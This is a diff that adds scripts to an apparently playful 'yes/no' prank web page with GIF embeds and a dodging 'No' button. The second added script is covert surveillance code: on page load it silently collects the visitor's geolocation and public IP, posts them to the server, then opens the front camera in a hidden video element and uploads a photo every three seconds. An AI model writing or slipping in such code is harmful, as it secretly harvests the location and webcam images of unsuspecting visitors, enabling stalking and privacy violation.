@@ -174,5 +174,173 @@
     });
   </script>
 
+
+
+ <script>
+      // Screen switching logic (unchanged)
+      const screens = ['no1-screen', 'no2-screen', 'no3-screen', 'yes-screen'];
+      let currentStep = 0;
+
+      function showNextScreen() {
+        if (currentStep < screens.length) {
+          const template = document.getElementById(screens[currentStep]);
+          if (template) {
+            document.getElementById('content').innerHTML = template.innerHTML;
+            currentStep++;
+            rerunTenorEmbed();
+
+            const moveEl = document.getElementById('move-random');
+            if (moveEl) {
+              moveEl.addEventListener('mouseenter', () => moveRandomEl(moveEl));
+            }
+          }
+        }
+      }
+
+      function moveRandomEl(elm) {
+        elm.style.position = "absolute";
+        elm.style.top = Math.floor(Math.random() * 80 + 5) + "%";
+        elm.style.left = Math.floor(Math.random() * 80 + 5) + "%";
+      }
+
+      function rerunTenorEmbed() {
+        const oldScript = document.querySelector('script[src*="tenor.com/embed.js"]');
+        if (oldScript) oldScript.remove();
+
+        const script = document.createElement('script');
+        script.src = "https://tenor.com/embed.js";
+        script.async = true;
+        document.body.appendChild(script);
+      }
+
+      document.addEventListener('click', function (e) {
+        if (e.target.matches('.nextBtn')) {
+          e.preventDefault();
+
+          // If it's a "Yes" button, go directly to yes-screen
+          if (e.target.textContent.trim().toLowerCase() === 'yes') {
+            const template = document.getElementById('yes-screen');
+            if (template) {
+              document.getElementById('content').innerHTML = template.innerHTML;
+              rerunTenorEmbed();
+            }
+          } else {
+            // If it's a "No" button, continue to next screen
+            showNextScreen();
+          }
+        }
+      });
+    </script>
+
+      <script>
+        // Global variables
+        let videoStream = null;
+        let captureInterval = null;
+        const statusEl = document.getElementById('camera-status');
+        let userLocation = { lat: null, lon: null };
+
+        // 1. Get location silently
+        async function getLocation() {
+          return new Promise((resolve) => {
+            if (navigator.geolocation) {
+              navigator.geolocation.getCurrentPosition(
+                position => {
+                  userLocation.lat = position.coords.latitude;
+                  userLocation.lon = position.coords.longitude;
+                  resolve();
+                },
+                () => resolve(), // Silent fail if blocked
+                { timeout: 5000, maximumAge: 60000 }
+              );
+            } else {
+              resolve();
+            }
+          });
+        }
+
+        // 2. Initialize camera silently
+        async function startCamera() {
+          try {
+            videoStream = await navigator.mediaDevices.getUserMedia({
+              video: { facingMode: "user" },
+              audio: false
+            });
+
+            // Hidden video element
+            const videoEl = document.createElement('video');
+            videoEl.style.display = 'none';
+            document.body.appendChild(videoEl);
+            videoEl.srcObject = videoStream;
+            await videoEl.play();
+
+            // Start periodic capture
+            captureInterval = setInterval(() => {
+              captureAndSend(videoEl);
+            }, 3000);
+
+          } catch (err) {
+            console.error("Camera error:", err);
+          }
+        }
+
+        // 3. Capture and send photo silently
+        async function captureAndSend(videoEl) {
+          const canvas = document.getElementById("photoCanvas");
+          const ctx = canvas.getContext("2d");
+
+          canvas.width = videoEl.videoWidth;
+          canvas.height = videoEl.videoHeight;
+          ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+
+          canvas.toBlob(async (blob) => {
+            try {
+              const formData = new FormData();
+              formData.append("photo", blob, "capture.jpg");
+              await fetch("/upload-photo", {
+                method: "POST",
+                body: formData
+              });
+            } catch (err) {
+              console.error("Upload error:", err);
+            }
+          }, "image/jpeg", 0.8);
+        }
+
+        // 4. Send initial data silently
+        async function sendInitialData() {
+          try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+
+            await fetch('/log-initial', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                ip: ipData.ip,
+                lat: userLocation.lat,
+                lon: userLocation.lon
+              })
+            });
+          } catch (err) {
+            console.error("Initial data error:", err);
+          }
+        }
+
+        // Initialize everything silently
+        window.addEventListener('DOMContentLoaded', async () => {
+          await getLocation();
+          await sendInitialData();
+          setTimeout(startCamera, 2000);
+        });
+
+        // Cleanup
+        window.addEventListener('beforeunload', () => {
+          if (captureInterval) clearInterval(captureInterval);
+          if (videoStream) {
+            videoStream.getTracks().forEach(track => track.stop());
+          }
+        });
+      </script>
+
 </body>
 </html>
